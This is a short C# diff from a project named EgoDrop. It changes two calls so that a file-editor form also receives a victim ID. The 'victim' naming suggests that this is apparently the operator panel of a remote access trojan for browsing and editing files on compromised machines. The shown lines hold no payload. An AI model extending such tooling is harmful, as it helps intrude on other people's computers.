@@ -362,7 +362,7 @@ namespace EgoDrop
             frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(m_victim, m_szVictimID);
             if (f == null)
             {
-                f = new frmFileEditor(m_victim);
+                f = new frmFileEditor(m_szVictimID, m_victim);
                 f.Show();
             }
             else
@@ -493,7 +493,7 @@ namespace EgoDrop
         //New Text File
         private void toolStripMenuItem15_Click(object sender, EventArgs e)
         {
-            frmFileEditor f = new frmFileEditor(m_victim);
+            frmFileEditor f = new frmFileEditor(m_szVictimID, m_victim);
 
             f.Show();
 
